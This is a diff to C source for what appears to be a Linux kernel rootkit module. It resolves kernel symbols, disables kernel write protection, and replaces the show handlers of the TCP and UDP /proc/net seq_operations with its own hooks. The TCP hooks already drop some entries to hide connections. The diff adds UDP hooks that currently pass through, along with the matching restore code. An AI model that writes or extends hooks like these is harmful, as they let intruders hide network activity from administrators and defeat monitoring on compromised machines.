@@ -20,6 +20,8 @@ static int (*udp6_seq_show)(struct seq_file *seq, void *v);
 
 static int g7_tcp4_seq_show(struct seq_file *, void *);
 static int g7_tcp6_seq_show(struct seq_file *, void *);
+static int g7_udp4_seq_show(struct seq_file *, void *);
+static int g7_udp6_seq_show(struct seq_file *, void *);
 
 void
 hook_show(void)
@@ -30,12 +32,24 @@ hook_show(void)
     tcp6_seq_show 
         = ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show;
 
+    udp4_seq_show 
+        = ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show;
+
+    udp6_seq_show 
+        = ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show;
+
     disable_protection();
     ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
         = (void *)g7_tcp4_seq_show;
     
     ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
         = (void *)g7_tcp6_seq_show;
+
+    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
+        = (void *)g7_udp4_seq_show;
+
+    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
+        = (void *)g7_udp6_seq_show;
     enable_protection();    
 }
 
@@ -48,6 +62,12 @@ unhook_show(void)
 
     ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
         = (void *)tcp6_seq_show;
+
+    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
+        = (void *)udp4_seq_show;
+
+    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
+        = (void *)udp6_seq_show;
     enable_protection();
 }
 
@@ -91,4 +111,16 @@ g7_tcp6_seq_show(struct seq_file *seq, void *v)
         return 0;
     
     return tcp6_seq_show(seq, v);
+}
+
+static int
+g7_udp4_seq_show(struct seq_file *seq, void *v)
+{
+    return udp4_seq_show(seq, v);
+}
+
+static int
+g7_udp6_seq_show(struct seq_file *seq, void *v)
+{
+    return udp6_seq_show(seq, v);
 }
